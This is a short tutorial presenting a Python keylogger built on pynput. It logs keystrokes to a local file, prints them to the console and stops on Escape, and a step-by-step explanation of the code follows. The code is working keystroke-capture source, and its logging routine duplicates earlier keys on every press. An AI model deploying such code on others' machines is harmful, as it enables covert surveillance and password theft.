# Keylogger

## Keylogger using Python.

This keylogger essentially tracks keyboard events, logging pressed keys to a file and providing basic feedback in the console. It stops listening for events when the Escape key is pressed.

```python
import pynput
from pynput.keyboard import Key, Listener

keys = []

def on_press(key):
    keys.append(key)
    write_file(keys)

    try:
        print('Alphanumeric key {0} pressed'.format(key.char))
    except AttributeError:
        print('Special key {0} pressed'.format(key))

def write_file(keys):
    with open('log.txt', 'a') as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find('space') > 0:
                f.write(' ')
            elif k.find('Key') == -1:
                f.write(k)
            
def on_release(key):
    print('{0} released'.format(key))
    if key == Key.esc:
        # Stop listener
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
```

## Here's a detailed explanation of the code:

- Import:
    - `import pynput`: Imports the pynput library, providing tools for controlling and monitoring input devices.
    
    - `from pynput.keyboard import Key, Listener`: Specifically imports the Key class for representing keys on the keyboard and the Listener class for monitoring keyboard events.

- Variables:
    - `keys = []`: Initializes an empty list named keys to store pressed keys.

- Functions:

    - `on_press(key)`: This function is called when a key is pressed:
        - It appends the pressed key to the keys list.
        - It calls the write_file function to log the pressed keys to a file.
        - It tries to print the character of the key using key. char. If it's not an alphanumeric key (e.g., Control, Shift), it prints a message about the special key instead.
    - `write_file(keys)`: This function writes the keys in the keys list to a file named log.txt:
        - It opens the file in append mode ('a') to add new keys without overwriting existing content.
        - It iterates through each key in the list:
            - It formats the key for logging by removing single quotes and handling space keys.
            - It writes the formatted key to the file, excluding keys represented as Key.<name> (e.g., Key.enter).
    - `on_release(key)`: This function is called when a key is released:
        - It prints a message indicating the released key.
        - If the released key is the Escape key (Key.esc), it returns False to stop the listener.

- Main execution:

    - `with Listener(on_press=on_press, on_release=on_release) as listener:`: Creates a keyboard listener object and sets the on_press and on_release functions as callbacks for corresponding events.
    - `listener.join()`: Starts the listener and keeps it running until it's stopped (e.g., by pressing Escape).
 
> [!WARNING]
> This is only for educational purpose.
